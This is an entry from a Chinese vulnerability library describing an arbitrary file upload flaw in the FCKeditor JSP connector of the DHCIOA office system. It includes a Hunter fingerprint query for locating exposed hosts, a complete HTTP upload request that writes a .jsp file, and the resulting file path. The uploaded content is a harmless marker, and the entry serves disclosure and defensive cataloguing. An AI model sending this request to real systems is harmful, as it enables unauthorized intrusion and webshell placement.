---
source: "wy876 漏洞文库"
title: "东华DHCIOA / FCKeditor JSP connector任意文件上传"
product: "东华DHCIOA / FCKeditor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；FCKeditor JSP connector启用且目录可执行"
prerequisites: "请求含JSESSIONID；是否登录未说明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yc0w19lqn3qt4ege"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97OA/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9Fconnector%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body=\"/skin/charmBlue/css/dialog.css\""
id: "vw-228aa3c2732459b68b5f921e"
entity_id: "ve-228aa3c2732459b68b5f921e"
schema_version: "1"
---

# 东华DHCIOA / FCKeditor JSP connector任意文件上传

## 条目说明

- 对象与具体问题：东华DHCIOA / FCKeditor；JSP connector任意文件上传
- 版本、配置及部署条件：无版本；FCKeditor JSP connector启用且目录可执行
- 认证与权限前提：请求含JSESSIONID；是否登录未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 主组件应标FCKeditor并关联宿主DHCIOA
- 仅上传123good可证明落地但不能证明代码执行，RCE需条件化
- 缺响应文本、文件名改写行为及修复版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
东华oa协同办公 (DHCIOA)选用B/S结构的作业模式，以个性化效芳的门户为基础，以消息传递、信息同享、公函、作业流处理技能为中心，以先进老练的计算机和通讯技能为首要手法，供给内部网络之间的信息沟通，有效处理、和谐各部分之间的作业，提高文件处理的精确性、及时性和科学性，为企事业/政府机关单位完成无纸化作业供给完整的软件支撑，全面提高作业效率。东华医疗协同办公系统 connector接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## 二、影响版本
+ 东华医疗协同办公系统

## 三、资产测绘
+ Hunter`web.body="/skin/charmBlue/css/dialog.css"`
+ 特征


## 四、漏洞复现
```http
POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
Host: 
Cookie: JSESSIONID=1******************************F
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
Connection: close

------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="NewFile"; filename="stc.jsp"
Content-Type: image/jpeg

123good
------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="Submit"

upload
------WebKitFormBoundaryt1qdEWTI01cj5BLV--
```

> 请求长度说明：原资料 Content-Length 为 292；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```http
/common/FCKeditor/UserFiles/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yc0w19lqn3qt4ege>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
